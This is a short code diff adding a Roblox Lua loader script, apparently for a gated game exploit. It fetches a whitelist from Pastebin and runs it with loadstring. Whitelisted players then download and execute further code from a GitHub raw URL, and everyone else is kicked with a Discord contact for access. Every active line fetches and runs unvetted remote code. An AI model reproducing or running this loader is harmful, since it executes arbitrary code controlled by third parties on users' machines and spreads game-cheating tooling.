@@ -1,0 +1,6 @@
+local whitelistecheck = loadstring(game:HttpGet("https://pastebin.com/raw/t2puuvtV", true))()
+if whitelistecheck[game:service('Players').LocalPlayer.UserId] then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeroWtw/4/main/4", true))()
+else
+game:service('Players').LocalPlayer:Kick('-DM texaco#4837 For Whitelist-')
+end
